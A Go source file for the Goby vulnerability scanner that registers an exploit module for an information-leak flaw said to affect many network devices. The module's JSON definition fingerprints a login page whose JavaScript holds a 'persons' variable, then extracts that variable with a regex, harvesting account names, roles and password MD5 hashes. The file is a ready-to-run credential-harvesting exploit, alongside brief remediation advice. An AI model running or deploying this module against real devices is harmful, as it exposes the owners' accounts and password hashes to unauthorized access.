package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Many network devices have password leaks",
  "Description": "Visit the default login page, the JS code on the home page discloses account information, including role, account, password MD5 value, status and other information",
  "Product": "Many network devices",
  "Homepage": "https://gobies.org/",
  "DisclosureDate": "2021-07-15",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"persons\"",
  "Level": "2",
  "Impact": "<p><span style=\"font-size: 14px;\">Information leakage is mainly caused by the negligence of developers or operations management personnel.</span><span style=\"font-size: 14px;\">If the debugging page is not deleted in time, the program debugging function is not closed, the program error information is not shielded, the backup file is not deleted, the database backup file is not deleted, the sensitive data information is not shielded and so on.</span><span style=\"font-size: 14px;\">The attacker can further analyze the attack target through the information he has mastered, so as to effectively launch the next effective attack</span><br></p>",
  "Recommandation": "<p>1. Delete the affected files to avoid information leakage.</p><p>2. Set up a unified error report page</p>",
  "References": [
    "https://mp.weixin.qq.com/s/utv9ZX4HhDmEtbhBlhFBBQ"
  ],
  "HasExp": true,
  "ExpParams": null,
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "var persons =",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "name",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "password",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody|regex|var persons =(.*)"
      ]
    }
  ],
  "Tags": [
    "information leakage"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Many network devices"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}